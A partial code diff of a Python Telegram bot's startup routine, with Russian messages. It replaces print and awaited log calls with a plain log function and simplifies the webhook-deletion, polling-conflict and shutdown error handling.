-        print('✅ Вебхук удалён')
+        log('✅ Вебхук удалён')
     except Exception as e:
-        await log(f'⚠️ Ошибка удаления вебхука: {e}')
+        log(f'⚠️ Ошибка вебхука: {e}')
     
-    # Запускаем polling
+    # Запускаем
     try:
         await dp.start_polling(
             bot,
             skip_updates=True,
             allowed_updates=['message', 'my_chat_member', 'edited_message']
         )
-    except TelegramConflictError as e:
-        await log(f'❌ КОНФЛИКТ: {e}', 'ERROR')
-        print(f'\n❌ КОНФЛИКТ!')
-        print('Решение: сбрось токен через @BotFather')
-        await bot.session.close()
-        sys.exit(1)
+    except TelegramConflictError:
+        log('❌ КОНФЛИКТ! Сбрось токен через @BotFather', 'ERROR')
     except Exception as e:
-        await log(f'❌ Ошибка: {e}', 'ERROR')
-        await bot.session.close()
-        sys.exit(1)
+        log(f'❌ Ошибка: {e}', 'ERROR')
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print('\n👋 Остановка пользователем')
+        log('👋 Остановка пользователем')
     except Exception as e:
-        print(f'❌ Критическая ошибка: {e}')
+        log(f'❌ Критическая ошибка: {e}', 'ERROR')
